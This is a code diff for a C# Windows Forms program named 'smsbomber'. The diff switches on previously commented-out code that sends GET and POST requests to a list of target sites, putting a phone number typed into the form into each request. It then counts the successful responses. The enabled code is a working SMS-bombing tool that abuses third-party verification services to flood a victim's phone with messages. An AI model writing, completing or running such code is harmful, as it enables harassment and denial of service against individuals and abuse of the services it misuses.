@@ -31,6 +31,7 @@ namespace smsbomber
         {
             Config config = new Config();
             config.ShowDialog();
+            loadconfig();
         }
 
         private void btngo_Click(object sender, EventArgs e)
@@ -87,44 +88,46 @@ namespace smsbomber
                 {
                     try
                     {
-                        //if(tar.Method.Equals("GET"))
-                        //{
-                        //    uri = new Uri(tar.Url.AbsoluteUri.Replace("%25mobile%25", this.tbxPhone.Text.Trim()));
-                        //    tar.Url = uri;
-                        //}
-                        //HttpWebRequest req = (HttpWebRequest)WebRequest.Create(tar.Url);
-                        //req.Accept = "*/*";
-                        //req.Referer = tar.Url.Host;
-                        //req.Method = tar.Method;
-                        //if(tar.Method.Equals("POST"))
-                        //{
-                        //    req.ContentType = "application/x-www-form-urlencoded";
-                        //    byte[] buffer = Encoding.UTF8.GetBytes(tar.FormName + "=" + this.tbxPhone.Text.Trim());
-                        //    req.ContentLength = buffer.Length;
-                        //    System.IO.Stream stream = null;
-                        //    try
-                        //    {
-                        //        stream = req.GetRequestStream();
-                        //        stream.Write(buffer, 0, buffer.Length);
-                        //    }
-                        //    catch (Exception e)
-                        //    {
-                        //        Log.LogError(e, "");
-                        //    }
-                        //    finally
-                        //    {
-                        //        if (stream != null) { stream.Close(); }
-                        //    }
-                        //}
+                        if (tar.Method.Equals("GET"))
+                        {
+                            uri = new Uri(tar.Url.AbsoluteUri.Replace("%25mobile%25", this.tbxPhone.Text.Trim()));
+                            tar.Url = uri;
+                        }
+                        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(tar.Url);
+                        req.Accept = "*/*";
+                        req.Referer = tar.Url.Host;
+                        req.Method = tar.Method;
+                        if (tar.Method.Equals("POST"))
+                        {
+
+                            req.ServicePoint.Expect100Continue = false;
+                            req.ContentType = "application/x-www-form-urlencoded";
+                            byte[] buffer = Encoding.UTF8.GetBytes(tar.FormName + "=" + this.tbxPhone.Text.Trim());
+                            req.ContentLength = buffer.Length;
+                            System.IO.Stream stream = null;
+                            try
+                            {
+                                stream = req.GetRequestStream();
+                                stream.Write(buffer, 0, buffer.Length);
+                            }
+                            catch (Exception e)
+                            {
+                                Log.LogError(e, "");
+                            }
+                            finally
+                            {
+                                if (stream != null) { stream.Close(); }
+                            }
+                        }
 
 
-                        //response = (HttpWebResponse)req.GetResponse();
+                        response = (HttpWebResponse)req.GetResponse();
 
-                        //reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
+                        reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
 
-                        //reader.ReadToEnd();
+                        reader.ReadToEnd();
 
-
+                       
                     }
                     catch (Exception e)
                     {
@@ -132,16 +135,17 @@ namespace smsbomber
                     }
                     finally
                     {
-                        if (reader != null) { reader.Close(); }
-                        int i = new Random().Next(1, 10);
-                        System.Diagnostics.Debug.Print(i.ToString());
-                        if (i == 5)//response.StatusCode == HttpStatusCode.OK
+                        
+                        //int i = new Random().Next(1, 10);
+                        //System.Diagnostics.Debug.Print(i.ToString());
+                        if (response.StatusCode == HttpStatusCode.OK)//
                         {
                             this.LVReort.Items[tar.Index].SubItems[3].Text = (++success).ToString();
 
                         }
                         else
                             this.LVReort.Items[tar.Index].SubItems[4].Text = (++fail).ToString();
+                        if (reader != null) { reader.Close(); }
                     }
                   
                 }
